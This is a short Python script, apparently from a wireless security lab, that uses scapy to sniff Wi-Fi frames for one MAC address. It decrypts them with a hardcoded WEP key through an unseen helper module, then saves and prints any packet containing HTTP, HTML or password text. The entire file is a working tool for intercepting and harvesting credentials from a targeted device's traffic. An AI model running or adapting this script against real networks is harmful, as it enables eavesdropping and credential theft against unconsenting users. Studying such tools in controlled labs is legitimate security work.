from scapy.all import *
import decrypt

pkl = PcapWriter("/home/kali/Desktop/WEPpackets.pcap", append = True, sync = True)

def test(p):
	if p.haslayer(Dot11WEP):
		dp = decrypt.decryptWEP(p,"ESAT2")
		if "HTTP"in str(dp) or "HTML" in str(dp).upper() or "PASSWORD" in str(dp).upper(): #geen upper bij http
			pkl.write(p)
			print("\n"+10*"-------------------"+"\n")
			return dp
		
print("sniffing started...")
sniff(iface="wlan1", filter="ether src 74:da:38:eb:6f:dc or ether dst 74:da:38:eb:6f:dc", prn=test, store=0)
#sniff(iface="wlan0", filter="ether src 74:da:38:eb:6f:dc or ether dst 74:da:38:eb:6f:dc", prn=test, store=0)
